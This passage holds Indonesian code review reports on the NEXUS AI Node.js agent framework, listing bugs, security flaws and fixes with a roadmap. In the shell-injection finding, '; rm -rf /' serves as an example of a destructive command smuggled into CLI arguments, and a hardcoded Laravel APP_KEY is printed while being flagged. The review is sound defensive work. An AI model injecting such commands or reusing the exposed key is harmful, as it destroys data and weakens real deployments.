**Dampak:** OOM kill di mesin dengan RAM terbatas.

**Solusi:** Gunakan `ParallelRunner` yang sudah ada:
```js
const results = await ParallelRunner.run(
    specialists,
    async (spec) => { /* ... logika audit */ },
    2  // max 2 concurrent scanner untuk 8GB RAM
);
```

---

### 🟠 15 — `SemanticEngine.cosineSimilarity`: Tidak Ada Zero-Norm Guard → NaN Corruption

**File:** `agent/core/SemanticEngine.js`

**Masalah:**
```js
cosineSimilarity(vecA, vecB) {
    // ...
    return dotProduct / (Math.sqrt(normA) * Math.sqrt(normB));
    // ⚠️ Jika normA atau normB = 0 → NaN
}
```

Jika embedding menghasilkan zero vector (model gagal, dokumen kosong), pembagian dengan 0 menghasilkan `NaN`. `NaN` kemudian menginfeksi seluruh hasil sort dan ranking.

**Dampak:** Semantic search mengembalikan urutan acak / undefined behavior.

**Solusi:**
```js
cosineSimilarity(vecA, vecB) {
    let dotProduct = 0, normA = 0, normB = 0;
    for (let i = 0; i < vecA.length; i++) {
        dotProduct += vecA[i] * vecB[i];
        normA += vecA[i] * vecA[i];
        normB += vecB[i] * vecB[i];
    }
    const denom = Math.sqrt(normA) * Math.sqrt(normB);
    if (denom === 0) return 0; // Zero vector = no similarity
    return dotProduct / denom;
}
```

---

### 🟠 16 — `RedisMemory`: `connect()` Tidak Dipanggil Sebelum `get()`/`set()`

**File:** `agent/core/RedisMemory.js`, `agent/core/SemanticEngine.js`

**Masalah:**
```js
// SemanticEngine.js
const cachedResults = await redis.get(cacheKey); // redis.isConnected = false
// → returns null, cache tidak pernah bekerja
```

`RedisMemory` hanya connect jika `connect()` dipanggil secara eksplisit. Tapi `SemanticEngine` dan komponen lain langsung memanggil `redis.get()` / `redis.set()` tanpa `await redis.connect()` terlebih dahulu. Hasilnya: Redis cache **tidak pernah berfungsi** meskipun kode seolah menggunakannya.

**Dampak:** Cache miss 100% → setiap search rebuild TF-IDF dari scratch.

**Solusi:** Auto-connect dengan lazy pattern:
```js
async _ensureConnected() {
    if (!this.isConnected) await this.connect();
}

async get(key) {
    await this._ensureConnected();
    if (!this.isConnected) return null;
    // ...
}
```

---

### 🟡 17 — `NexusEngine.runCycle()`: Tidak Ada Global Timeout

**File:** `agent/core/NexusEngine.js`

**Masalah:**
`runCycle()` tidak memiliki batas waktu global. Jika fase audit, planning, atau execution hang (misalnya karena Ollama lambat), seluruh cycle berjalan tanpa henti.

**Solusi:**
```js
async runCycle(options = {}) {
    const CYCLE_TIMEOUT_MS = 10 * 60 * 1000; // 10 menit
    const cyclePromise = this._doRunCycle(options);
    const timeoutPromise = new Promise((_, reject) =>
        setTimeout(() => reject(new NexusError('TIMEOUT', 'Cycle exceeded 10 minutes')), CYCLE_TIMEOUT_MS)
    );
    return Promise.race([cyclePromise, timeoutPromise]);
}
```

---

### 🟡 18 — `EventBus`: Deduplication 1 Detik Terlalu Agresif

**File:** `agent/core/EventBus.js`

**Masalah:**
```js
const eventKey = `${event}-${JSON.stringify(payload)}`;
if (this._recentEvents.has(eventKey)) return; // Drop!
```

Dua task berbeda yang menghasilkan payload identik dalam 1 detik akan di-drop satu di antaranya secara diam-diam. Kasus nyata: dua scanner mengirim `SCANNER_TRIGGERED` untuk file yang sama dalam waktu berdekatan.

**Solusi:** Dedup berdasarkan `task_id`, bukan seluruh payload:
```js
const eventKey = `${event}-${payload?.task_id || JSON.stringify(payload)}`;
```

---

### 🟡 19 — `MemoryPipeline.writeSemanticIndex()` Duplikat dengan `SemanticEngine`

**File:** `agent/core/MemoryPipeline.js`, `agent/core/SemanticEngine.js`

**Masalah:**
Dua sistem index berjalan paralel dan tidak terhubung:
- `MemoryPipeline.writeSemanticIndex()` → regex tag extraction → `semantic_tag_index.json`
- `SemanticEngine.buildIndex()` → TF-IDF + Ollama embeddings → `vector_index.json`

Keduanya menulis ke direktori `semantic/` yang sama dengan format berbeda. SemanticEngine yang digunakan aktif untuk search, sementara MemoryPipeline menghasilkan file yang tidak pernah dibaca.

**Solusi:** Hapus `writeSemanticIndex()` dari `MemoryPipeline`. Delegasikan sepenuhnya ke `SemanticEngine.buildIndex()`. Panggil dari `KnowledgePhase` setelah `memoryPipeline.optimize()` selesai.

---

### 🟡 20 — `MemoryGovernor` vs `MemoryPipeline`: Ownership Tumpang Tindih

**File:** `agent/core/MemoryGovernor.js`, `agent/core/MemoryPipeline.js`

**Masalah:**
Keduanya mengelola direktori `memory/` yang sama:
- `MemoryGovernor`: tulis ke `memory/[category]/`, acquire file lock, versioning
- `MemoryPipeline`: tulis ke `memory/distilled/`, `memory/archived/`, versioned write sendiri

Tidak ada batas kepemilikan yang jelas. `NexusEngine` menginstansiasi `MemoryPipeline` tapi `MemoryGovernor` diimport tapi tidak di-`new` secara eksplisit di constructor `NexusEngine` — kemungkinan besar unused instance.

**Solusi:** Tetapkan boundary yang jelas:
- `MemoryGovernor` → semua write ke `memory/` (owner tunggal, semua lewat sini)
- `MemoryPipeline` → orchestration logic (kapan archive, kapan distill), delegasikan write ke `MemoryGovernor`

---

### 🟡 21 — `Contract.js` Menggunakan `new Date()` Bukan `NexusClock`

**File:** `agent/core/Contract.js`

**Masalah:**
```js
class AuditReport {
    constructor(...) {
        this.timestamp = new Date().toISOString(); // ← UTC (Z suffix)
    }
}
```

`NexusClock` sudah dibuat untuk memastikan konsistensi timestamp UTC+8 di seluruh sistem, tapi `AuditReport` dan `ImplementationPlan` masih menggunakan `new Date().toISOString()` yang menghasilkan format `2026-05-16T07:00:00.000Z`. Hasilnya: timestamp di audit report bertentangan dengan timestamp di log file.

**Solusi:**
```js
const NexusClock = require('./NexusClock');

class AuditReport {
    constructor(...) {
        this.timestamp = NexusClock.getISOTimestamp();
    }
}
```

---

### 🟡 22 — `ExecutionPhase.cleanCodeAndVerify()`: Pola Legacy Hardcoded

**File:** `agent/core/phases/ExecutionPhase.js`

**Masalah:**
```js
const legacyPatterns = ['UrlShortener', 'UrlMapping', 'ShortenUrl', 'UrlController'];
```

Pola ini adalah sisa dari sandbox `url-shortener` yang dijadikan template. Ketika NEXUS dijalankan pada project lain (misal SaaS, e-commerce), fungsi ini akan:
1. Tidak menemukan apa-apa → silent no-op
2. Atau, jika project kebetulan punya class bernama serupa → menghapus file yang valid

**Solusi:** Bangun `legacyPatterns` secara dinamis dari `NEXUS_BLUEPRINT.json`:
```js
const blueprint = await fs.readJson(blueprintPath).catch(() => ({}));
const allowedComponents = (blueprint.livewire_components || []).map(c => this.toKebabCase(c));
const legacyPatterns = blueprint.legacy_patterns || [];
```

---

### 🟡 23 — `main.js` Membuat Dua Instance `Orchestrator` yang Berbeda

**File:** `agent/main.js`

**Masalah:**
```js
// main.js
const engine = new NexusEngine({ rootPath: ... });        // → this.orchestrator = new Orchestrator(...)
const orchestrator = new Orchestrator(path.resolve(...)); // ← Instance kedua, tidak pernah dipakai
```

`NexusEngine` sudah membuat instance `Orchestrator` internal. Instance kedua di `main.js` memiliki DLQ terpisah, EventBus listeners terpisah, dan tidak pernah digunakan. Ini membuang memori dan bisa menyebabkan dua listener `SCANNER_TRIGGERED` aktif sekaligus.

**Solusi:** Hapus baris `const orchestrator = new Orchestrator(...)` dari `main.js`. Gunakan `engine.orchestrator` jika perlu akses dari luar.

---

### 🟡 24 — `EvolutionPiper.spawnRealLaravel()`: Dead Code

**File:** `agent/core/EvolutionPiper.js`

**Masalah:**
```js
async spawnRealLaravel(name) {
    await this.checkEvolutionBoundary();
    const targetPath = path.join(this.sandboxPath, name);
    await fs.ensureDir(targetPath);
    console.log(`🚀 Installing real Laravel...`);
    
    // This will be executed via run_command in the main flow
    return targetPath; // ← Tidak ada Composer, tidak ada installasi
}
```

Fungsi ini hanya membuat direktori kosong. Tidak ada `composer create-project` atau instalasi apapun. Komentar "will be executed via run_command" menunjukkan ini belum diimplementasikan.

**Dampak:** Siapapun yang memanggil `spawnRealLaravel()` mendapat direktori kosong tanpa Laravel.

**Solusi:** Implementasikan atau tandai sebagai `@throws`:
```js
async spawnRealLaravel(name) {
    throw new Error('spawnRealLaravel: Not yet implemented. Use spawnSandbox() with scenario "crud" instead.');
}
```

---

### 🟡 25 — `Distiller` Menginstansiasi `NativeBridge` yang Tidak Pernah Dipakai

**File:** `agent/core/Distiller.js`

**Masalah:**
```js
class Distiller {
    constructor(knowledgePath) {
        this.semanticEngine = new SemanticEngine(knowledgePath);
        this.native = new NativeBridge(path.join(knowledgePath, '..', '..')); // ← tidak pernah dipanggil
    }
}
```

`this.native` dideklarasikan tapi tidak ada satu pun method `Distiller` yang memanggilnya. Ini membuang memori dan membingungkan — apakah ada rencana integrasi C++ di Distiller yang belum diimplementasikan?

**Solusi:** Hapus baris `this.native = new NativeBridge(...)` sampai ada kebutuhan konkret, atau dokumentasikan tujuannya.

---

### 🟡 26 — `ExecutionPhase.getAvailablePort()`: Rekursi Tanpa Batas Atas

**File:** `agent/core/phases/ExecutionPhase.js`

**Masalah:**
```js
async getAvailablePort(start = 8001) {
    const net = require('net');
    return new Promise((resolve) => {
        const server = net.createServer();
        server.listen(start, () => {
            server.close(() => resolve(start));
        });
        server.on('error', () => {
            resolve(this.getAvailablePort(start + 1)); // ← rekursi tanpa batas
        });
    });
}
```

Jika semua port dari 8001 hingga 65535 terisi (sangat tidak mungkin tapi mungkin di lingkungan container yang terbatas), fungsi ini akan stack overflow. Juga tidak ada cara untuk menghentikan pencarian.

**Solusi:**
```js
async getAvailablePort(start = 8001, maxPort = 9000) {
    if (start > maxPort) throw new Error(`No available port found between 8001-${maxPort}`);
    // ... existing logic dengan maxPort check
}
```

---

### 🟡 27 — CI Tidak Test Redis/Ollama + `.env` dengan APP_KEY di Repo

**File:** `.github/workflows/ci.yml`, `agent/core/EvolutionPiper.js`, `.env`

**Masalah A — CI:**
```yaml
# ci.yml — tidak ada:
# services: redis: ...
# Ollama mock/stub
```

`npm test` dijalankan tanpa Redis atau Ollama. Karena `RedisMemory` dan `LocalIntelligence` keduanya memiliki graceful fallback (`return null`, `return false`), CI selalu hijau meskipun integrasi tersebut broken.

**Masalah B — APP_KEY hardcoded:**
```js
// EvolutionPiper.spawnSandbox() — hardcoded di source code:
{ name: '.env', content: 'APP_KEY=base64:a7gkNyQZZ4HamHeiMoQ2gFJygojiFUCyzXDTKQ3YwG4=' }
```

Laravel APP_KEY hardcoded di source code. Meskipun ini untuk sandbox test, key ini bisa disalahgunakan jika seseorang reuse untuk production.

**Solusi A:**
```yaml
# Tambahkan di ci.yml
services:
  redis:
    image: redis:7-alpine
    ports: ['6379:6379']
# Untuk Ollama: gunakan mock/stub di test environment
```

**Solusi B:**
```js
// Generate key dinamis:
const { execSync } = require('child_process');
const appKey = `base64:${require('crypto').randomBytes(32).toString('base64')}`;
{ name: '.env', content: `APP_KEY=${appKey}` }
```

---

## Rekap & Roadmap Perbaikan

### Phase 1 — Immediate (sebelum cycle berikutnya)
| No | Isu | Effort |
|----|-----|--------|
| 01 | Pecah prompt monolitik 2MB | 2-3 jam |
| 02 | Tambah timeout di `executeTask` | 30 menit |
| 03 | Fix `.exe` hardcode di `NativeBridge` | 15 menit |
| 04 | Fix path traversal di `SandboxExecutor` | 1 jam |
| 05 | Ganti `flushAll()` dengan namespace delete | 30 menit |
| 06 | Implementasi `_writeQueue` di `Logger` | 1 jam |

### Phase 2 — Sprint Berikutnya
| No | Isu | Effort |
|----|-----|--------|
| 07 | Lazy init `NexusEngine` | 3-4 jam |
| 08 | Fix `LocalIntelligence` singleton race | 1 jam |
| 09 | Circuit breaker Ollama | 2 jam |
| 10 | EventBus listener cleanup | 1 jam |
| 11 | Wire `AgentRegistry` ke Orchestrator | 2 jam |
| 12 | Persist `EvolutionPiper` cycle state | 1 jam |
| 13 | Async `WorktreeManager` | 1 jam |
| 14 | Tambah `pLimit` di `AuditPhase` | 30 menit |
| 15 | Zero-norm guard `cosineSimilarity` | 15 menit |
| 16 | Auto-connect `RedisMemory` | 30 menit |

### Phase 3 — Technical Debt
| No | Isu | Effort |
|----|-----|--------|
| 17 | Global timeout `runCycle` | 30 menit |
| 18 | Fix EventBus dedup key | 15 menit |
| 19 | Hapus duplicate semantic index | 1 jam |
| 20 | Tetapkan boundary MemoryGovernor/Pipeline | 2-3 jam |
| 21 | Konsistensi timestamp Contract.js | 15 menit |
| 22 | Dynamic legacy patterns | 1 jam |
| 23 | Hapus duplicate Orchestrator di main.js | 15 menit |
| 24 | Stub atau implementasikan spawnRealLaravel | 2-4 jam |
| 25 | Hapus unused NativeBridge di Distiller | 5 menit |
| 26 | Bounded recursion getAvailablePort | 15 menit |
| 27 | Fix CI + rotate hardcoded APP_KEY | 1 jam |

---

## Hal yang Sudah Baik ✅

Dokumentasi ini bukan sekadar daftar masalah. NEXUS AI memiliki beberapa keputusan arsitektur yang patut dipertahankan:

- **EventBus dengan schema validation** — event schema registry mencegah typo event name
- **Dead Letter Queue di Orchestrator** — task gagal tidak hilang begitu saja
- **Guardrail whitelist di LocalIntelligence** — task whitelist + output length cap
- **Versioned write di MemoryPipeline** — tidak ada data yang overwritten tanpa backup
- **Stale lock detection di MemoryGovernor** — lock file dengan TTL + PID tracking
- **ResourceMonitor tiered recommendation** — PROCEED/THROTTLE/PAUSE berdasarkan CPU+RAM
- **DecisionEngine weight profiles** — context-aware decision making yang extensible
- **Machinist path whitelist** — generated scanner tidak bisa menyentuh core engine
- **TaskProtocol dengan trace_id** — setiap task bisa di-trace end-to-end

---

*Report ini dihasilkan dari analisis statis terhadap source code NEXUS AI v3.3.0.*  
*Total file dianalisis: 27 | Total isu ditemukan: 27 | Critical: 6 | High: 10 | Medium: 11*


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_AI_CODE_REVIEW.MD

# 🤖 NEXUS AI — Laporan Code Review Komprehensif
> **VERSION**: v1 | **Last Updated**: 26/05/2026


**Tanggal Review:** 15 Mei 2026  
**Reviewer:** AI Engineering Assistant Senior  
**Versi Project:** 3.3.0  
**Klasifikasi:** Internal Engineering Report

---

## 1. RINGKASAN PROJECT

**Human-AI Nexus** adalah sebuah framework CLI (Command Line Interface) berbasis **Node.js** yang bertindak sebagai "otak" agentic untuk mengaudit, merencanakan, dan mengeksekusi perbaikan pada project lain (khususnya stack TALL: Tailwind, Alpine.js, Livewire, Laravel).

| Aspek | Detail |
|---|---|
| **Nama** | `human-ai-nexus` |
| **Versi** | `3.3.0` |
| **Runtime** | Node.js ≥ 16, dijalankan di Node 22 (Docker) |
| **Bahasa** | JavaScript (CommonJS) |
| **Framework** | Custom multi-agent framework (tanpa Express/NestJS) |
| **Entry Point** | `cli.js` → `agent/main.js` → `agent/core/NexusEngine.js` |
| **Containerisasi** | Docker + Docker Compose |
| **CI/CD** | GitHub Actions (`npm-publish.yml`) |
| **Testing** | Custom TDD runner (`tests/TDD/runner.js`) |
| **Dependensi Utama** | `axios`, `chalk`, `fs-extra`, `glob`, `natural`, `redis` |
| **AI Backend** | Ollama (lokal) via `http://localhost:11434` |
| **Memory** | Redis + file-based JSON/Markdown |

### Arsitektur Folder
```
NEXUS AI/
├── agent/
│   ├── core/            # Engine utama (NexusEngine, Orchestrator, dll)
│   ├── tools/           # Scanner & tool plugins
│   ├── prompts/         # Prompt agent (internal & external)
│   ├── workflows/       # Definisi workflow per agent
│   └── main.js          # Entry point agent
├── cli.js               # CLI dispatcher
├── tests/TDD/           # Unit & sandbox tests
├── documentation/       # Audit logs & mermaid diagrams
├── config/              # .env.example
├── .github/workflows/   # CI/CD pipeline
├── Dockerfile
└── docker-compose.yml
```

**Kekuatan Arsitektur:** Pemisahan yang jelas antara `core/`, `tools/`, `prompts/`, dan `workflows/` menunjukkan pemikiran modular yang matang. Penggunaan `EventBus` sebagai pub/sub backbone dan `DeadLetterQueue` menunjukkan pemahaman sistem distributed yang baik.

---

## 2. TEMUAN UTAMA

### 🔴 KRITIS
1. **`.env` ter-commit ke Git** — file `.env` dengan path sensitif (`/home/faisal/projects/...`) ada di dalam ZIP, artinya pernah atau masih di-track oleh Git.
2. **`SandboxExecutor` bukan sandbox nyata** — meski bernama "sandbox", eksekusi plugin dilakukan via `require()` langsung di process utama, bukan `vm.runInNewContext` atau Worker Thread sesungguhnya.
3. **`shell: true` pada `spawn()`** — di `cli.js` dan `NexusEngine.js`, penggunaan `shell: true` membuka potensi shell injection jika input berasal dari user/external.

### 🟠 PENTING
4. **`initRedis()` tanpa error handling** — jika Redis tidak tersedia, proses utama bisa crash diam-diam.
5. **`package-lock.json` tidak ada** — CI/CD menggunakan `npm ci` yang membutuhkan `package-lock.json`, ini akan selalu gagal.
6. **`docker-compose.yml` tidak memiliki `env_file`** — environment secrets tidak dimasukkan dengan aman ke container.
7. **CI/CD pipeline hanya trigger saat `release`** — tidak ada pipeline untuk `push` atau `pull_request`, sehingga tidak ada otomasi testing pada development sehari-hari.

### 🟡 PERLU PERHATIAN
8. **Logger menulis ulang seluruh array JSON setiap log entry** — performa I/O buruk saat log volume tinggi.
9. **Koneksi Redis dibuat satu kali global (singleton)** tanpa reconnect logic.
10. **`SemanticEngine` menggunakan TF-IDF lokal** yang diload ke memori seluruhnya — potensi memory bloat untuk knowledge base besar.

---

## 3. REVIEW KODE

### 3.1 `cli.js` — Entry Point

**Masalah ditemukan:**

```javascript
// ❌ MASALAH: shell: true + template literal dari args user
const child = spawn('node', [`"${enginePath}"`, ...cleanArgs], {
    stdio: 'inherit',
    shell: true  // ← Bahaya! Shell injection possible
});
```

`cleanArgs` berasal langsung dari `process.argv` user. Jika user memasukkan `; rm -rf /`, `shell: true` akan mengeksekusinya. Seharusnya:

```javascript
// ✅ Perbaikan: Gunakan array args tanpa shell
const child = spawn('node', [enginePath, ...cleanArgs], {
    stdio: 'inherit',
    shell: false  // ← Aman, args tidak diproses shell
});
```

**Kekuatan:** Struktur command dispatch (router `engineCommands`) rapi dan mudah diperluas.

---

### 3.2 `agent/core/NexusEngine.js` — Core Engine (1317 baris)

File ini terlalu besar. Single file 1317 baris melanggar prinsip Single Responsibility. Berikut masalah spesifik:

**a) `initRedis()` tanpa error handling:**
```javascript
async initRedis() {
    await redis.connect();        // ← Jika Redis down, throw tanpa catch
    await localAI.checkAvailability();
}
```
Akibatnya, jika Redis tidak aktif, NexusEngine gagal inisialisasi secara diam-diam (error tidak ditangkap di constructor karena `initRedis()` dipanggil tanpa `await` di constructor).

**b) `spawn` dengan `shell: true` di `cleanCodeAndVerify()`:**
```javascript
const serveProc = spawn('php', ['artisan', 'serve', '--port=8001'], 
    { cwd: projectPath, shell: true });  // ← projectPath dari user input
```
`projectPath` bisa dimanipulasi.

**c) `require()` di dalam loop/fungsi:**
```javascript
async blueprintApp(options = {}) {
    const LocalIntelligence = require('./LocalIntelligence'); // ← Inside method
    // ...
    const { spawn } = require('child_process'); // ← Inside loop
}
```
`require()` seharusnya di top-level file untuk kejelasan dependency dan performa.

**Kekuatan:** Design pattern state machine (`STATES: INIT, PROCESSING, EXECUTING...`) dan custom `NexusError` class sangat baik untuk traceability.

---

### 3.3 `agent/core/SandboxExecutor.js` — "Sandbox" yang Bukan Sandbox

```javascript
// ❌ Ini bukan sandbox nyata!
const plugin = require(pluginPath);  // ← Berjalan di process yang sama
const action = plugin.scan ? plugin.scan : plugin.execute;
Promise.resolve(action(args)).then(...);
```

Nama `SandboxExecutor` menyesatkan. Plugin yang di-require bisa:
- Mengakses `process.env` (termasuk secrets)
- Menulis ke filesystem sembarangan
- Melakukan network request
- Memanggil `process.exit()`

Jika benar-benar ingin isolated sandbox, harus menggunakan:
```javascript
// ✅ Opsi 1: Worker Threads (sudah ada import tapi tidak dipakai)
const { Worker } = require('worker_threads'); // ← Sudah di-import tapi tidak digunakan!

// ✅ Opsi 2: vm2 / isolated-vm library
```

**Ironi:** `Worker` sudah di-import di baris pertama file tapi tidak pernah digunakan.

---

### 3.4 `agent/core/EventBus.js` — Solid

EventBus adalah salah satu implementasi paling bersih di project ini:
- Schema registry (`EVENT_SCHEMA`) mencegah typo event name
- Deduplication dengan TTL 1 detik mencegah event storm
- Audit log untuk traceability

**Satu catatan:** Deduplication menggunakan `JSON.stringify(payload)` yang bisa salah untuk payload besar (object dengan property sama tapi order berbeda tidak akan ter-deduplicate).

---

### 3.5 `agent/core/Logger.js` — Performa I/O Buruk

```javascript
// ❌ Setiap log entry: baca seluruh file → push → tulis ulang seluruh file
let logs = [];
if (await fs.pathExists(logFile)) {
    logs = await fs.readJson(logFile);  // Baca seluruh array
}
logs.push(logEntry);
await fs.writeJson(logFile, logs, { spaces: 2 }); // Tulis ulang seluruh file
```

Untuk sistem dengan aktivitas tinggi, pola ini adalah bottleneck besar. Dengan 1000 log entries, setiap operasi baca-tulis semakin lambat. Solusi:
```javascript
// ✅ Gunakan append mode (NDJSON/newline-delimited JSON)
await fs.appendFile(logFile, JSON.stringify(logEntry) + '\n');
```

---

### 3.6 `agent/core/AgentRegistry.js` — Bagus

Implementasi yang solid dengan API yang jelas (`register`, `markBusy`, `markIdle`, `markFailed`, `getStuckAgents`). Deteksi "stuck agent" dengan threshold time adalah fitur production-grade yang baik.

---

### 3.7 `agent/core/SemanticEngine.js` — Fungsional, Ada Risk

- TF-IDF via `natural` library bekerja untuk use case ini
- Integrasi Ollama untuk embedding adalah pilihan baik (local-first AI)
- Redis caching untuk search results (TTL 30 menit) efisien

**Risiko:** `buildIndex()` membaca semua file knowledge ke memori sekaligus. Untuk knowledge base besar (>500 files), ini bisa menyebabkan OOM.

---

### 3.8 `agent/core/MemoryPipeline.js` — Solid

`versionedWrite()` (backup sebelum overwrite) adalah pattern yang sangat baik untuk mencegah data loss. Ini menunjukkan kesadaran terhadap integritas data.

---

## 4. REVIEW PIPELINE

### 4.1 GitHub Actions (`.github/workflows/npm-publish.yml`)

```yaml
on:
  release:
    types: [created]  # ← HANYA trigger saat release dibuat
```

**Masalah Kritis:**
- **Tidak ada pipeline untuk `push` / `pull_request`** — setiap commit ke `main` tidak otomatis ditest
- **`npm ci` akan gagal** karena tidak ada `package-lock.json` di repository (dicek dari `.gitignore` dan ZIP content)
- **Tidak ada caching** untuk `node_modules` — setiap run install ulang dari awal (lambat)
- **Dua job (`build` dan `publish-npm`) melakukan `npm ci` dua kali** — duplikasi tidak perlu

**Saran perbaikan pipeline:**
```yaml
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: 'npm'           # ← Cache node_modules
      - run: npm ci
      - run: npm test
      - run: npm run lint        # ← Tambahkan lint

  publish-npm:
    needs: test
    if: github.event_name == 'release'
    # ...
```

### 4.2 Docker

**Masalah di `Dockerfile`:**
```dockerfile
COPY . .  # ← Menyalin .env ke container jika tidak ada di .dockerignore
```

`.dockerignore` memang sudah ada dan mencantumkan `.env`, **tapi** `docker-compose.yml` tidak menggunakan `env_file` atau Docker Secrets:
```yaml
# ❌ Tidak ada env_file atau secrets di docker-compose
environment:
  - NEXUS_MODE=autonomous  # Hanya hardcode ini
```

**Tidak ada health check** di `docker-compose.yml`:
```yaml
# ✅ Tambahkan:
healthcheck:
  test: ["CMD", "node", "-e", "require('./cli.js')"]
  interval: 30s
  timeout: 10s
  retries: 3
```

**Versi Dockerfile vs `package.json` tidak sinkron:**
- Dockerfile: `node:22-alpine`, label `version="3.1.0"`
- `package.json`: versi `3.3.0`

### 4.3 Testing

**Positif:** Ada struktur test di `tests/TDD/` dengan beberapa test file.

**Masalah:**
- Test runner custom (`runner.js`) tidak menggunakan framework standar (Jest/Mocha) — maintainability rendah
- **Tidak ada perintah lint** di `package.json`
- **Tidak ada code coverage** reporting
- Test hanya di `tests/TDD/` — tidak ada integration test untuk CLI end-to-end
- `tests/sandboxes/` menyertakan direktori `vendor/` PHP — **ini tidak boleh ada di repository** (berat, tidak relevan untuk Node project)

---

## 5. SECURITY & PERFORMANCE CHECK

### 🔴 SECURITY ISSUES

| # | Severity | Lokasi | Deskripsi |
|---|---|---|---|
| S1 | CRITICAL | `cli.js:23` | `spawn(..., {shell: true})` dengan user args — Shell Injection |
| S2 | CRITICAL | `.env` | File `.env` dengan personal path ada dalam ZIP (pernah/masih di-track Git) |
| S3 | HIGH | `SandboxExecutor.js` | Plugin berjalan di proses utama, bisa akses `process.env` dan secrets |
| S4 | HIGH | `NexusEngine.js:854-855` | `spawn(..., {shell: true})` dengan `projectPath` dari user input |
| S5 | MEDIUM | `docker-compose.yml` | Tidak ada network isolation — container bisa akses semua network |
| S6 | MEDIUM | `config/.env.example` | File `.env.example` hampir kosong (hanya 70 bytes), tidak mendokumentasikan semua env vars yang dibutuhkan |
| S7 | LOW | `.env:5` | Path absolut personal developer (`/home/faisal/...`) ter-commit |

### 🟠 PERFORMANCE ISSUES

| # | Severity | Lokasi | Deskripsi |
|---|---|---|---|
| P1 | HIGH | `Logger.js` | Read-entire-array + rewrite setiap log entry — O(n) I/O per log |
| P2 | HIGH | `SemanticEngine.js` | `buildIndex()` memuat semua files ke RAM sekaligus |
| P3 | MEDIUM | `NexusEngine.js` | Tidak ada connection pooling untuk axios HTTP calls |
| P4 | MEDIUM | `cleanCodeAndVerify()` | Loop spawn 5x dengan `setTimeout(8000)` = minimal 40 detik blocking |
| P5 | LOW | `EventBus.js` | `JSON.stringify(payload)` di setiap event untuk deduplication overhead |

---

## 6. SARAN PERBAIKAN PRIORITAS TINGGI

### P1: Perbaiki Shell Injection di `cli.js`

```javascript
// SEBELUM (❌)
const child = spawn('node', [`"${enginePath}"`, ...cleanArgs], {
    shell: true
});

// SESUDAH (✅)
const child = spawn('node', [enginePath, ...cleanArgs], {
    shell: false
});
```

### P2: Rotasi `.env` dan Tambahkan ke `.gitignore` dengan Benar

```bash
# Cek apakah .env masih di-track Git
git ls-files --error-unmatch .env

# Jika ya, hapus dari tracking
git rm --cached .env
echo ".env" >> .gitignore
git commit -m "chore: remove .env from git tracking"
```

Karena `.env` pernah ter-commit, buat secret rotation untuk `APP_KEY` dan `DB_PASSWORD`.

### P3: Perbaiki `package-lock.json`

```bash
npm install  # Generate package-lock.json
git add package-lock.json
git commit -m "chore: add package-lock.json for reproducible builds"
```

CI/CD `npm ci` **akan selalu gagal** tanpa ini.

### P4: Tambahkan Pipeline CI untuk `push` / `pull_request`

Ganti trigger di `npm-publish.yml` (atau buat file baru `ci.yml`) agar testing berjalan di setiap commit, bukan hanya saat release.

### P5: Perbaiki `SandboxExecutor` — Gunakan Worker Thread Nyata

```javascript
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');

execute(pluginPath, args, options = {}) {
    return new Promise((resolve, reject) => {
        const worker = new Worker(`
            const { workerData, parentPort } = require('worker_threads');
            const plugin = require(workerData.pluginPath);
            const action = plugin.scan || plugin.execute;
            Promise.resolve(action(workerData.args))
                .then(r => parentPort.postMessage({ ok: true, result: r }))
                .catch(e => parentPort.postMessage({ ok: false, error: e.message }));
        `, { eval: true, workerData: { pluginPath, args } });
        
        const timer = setTimeout(() => { worker.terminate(); reject(new Error('Timeout')); }, timeout);
        worker.on('message', (msg) => {
            clearTimeout(timer);
            msg.ok ? resolve(msg.result) : reject(new Error(msg.error));
        });
    });
}
```

---

## 7. SARAN PERBAIKAN PRIORITAS MENENGAH

### M1: Refactor `Logger.js` — Gunakan Append Mode

```javascript
// Ganti baca-tulis-ulang array dengan append NDJSON
async log(category, level, agent, task_id, event, message, duration_ms = 0, metadata = {}, trace_id = 'N/A') {
    const logEntry = { trace_id, timestamp: NexusClock.getISOTimestamp(), level, agent, task_id, event, message, duration_ms, metadata };
    const logFile = path.join(this.logPath, category, `${NexusClock.getDateString()}.ndjson`);
    await fs.ensureDir(path.dirname(logFile));
    await fs.appendFile(logFile, JSON.stringify(logEntry) + '\n');
}
```

### M2: Pisah `NexusEngine.js` Menjadi Modul Terpisah

File 1317 baris perlu dipecah. Saran:
```
agent/core/
├── NexusEngine.js        # Hanya bootstrap + koordinasi (< 200 baris)
├── AuditPhase.js         # Logic audit()
├── PlanningPhase.js      # Logic plan()
├── ExecutionPhase.js     # Logic execute()
├── HarvestPhase.js       # Logic harvest(), massRefactor()
└── StatusReporter.js     # Logic getSystemStatus()
```

### M3: Tambahkan `env_file` ke `docker-compose.yml`

```yaml
services:
  nexus-ai:
    build: .
    env_file:
      - .env               # ← Load dari .env file
    environment:
      - NEXUS_MODE=autonomous  # Override jika perlu
```

### M4: Perbaiki `initRedis()` — Graceful Degradation

```javascript
async initRedis() {
    try {
        await redis.connect();
        this.log('✅ Redis connected.', 'success');
    } catch (e) {
        this.log(`⚠️  Redis unavailable: ${e.message}. Running in file-only mode.`, 'warning');
        this.useRedis = false;  // Flag untuk skip Redis calls
    }
    
    try {
        await localAI.checkAvailability();
    } catch (e) {
        this.log(`⚠️  Ollama unavailable: ${e.message}. AI features disabled.`, 'warning');
        this.useLocalAI = false;
    }
}
```

### M5: Tambahkan ESLint + Format Standard

```bash
npm install --save-dev eslint eslint-config-standard
```

Buat `.eslintrc.json`:
```json
{
  "extends": "standard",
  "rules": {
    "no-eval": "error",
    "no-new-func": "error"
  }
}
```

Tambahkan ke `package.json`:
```json
"scripts": {
  "lint": "eslint agent/ cli.js tests/TDD/*.js"
}
```

### M6: Lengkapi `.env.example`

File `.env.example` saat ini hampir kosong (70 bytes). Dokumentasikan semua env vars:
```bash
# Runtime
NODE_ENV=development

# Project
PROJECT_PATH=./             # Path ke project yang diaudit

# Redis (opsional — fallback ke file-based jika tidak ada)
REDIS_URL=redis://localhost:6379

# Ollama AI (opsional — fallback ke TF-IDF jika tidak ada)
OLLAMA_BASE_URL=http://localhost:11434/api
OLLAMA_MODEL=nomic-embed-text

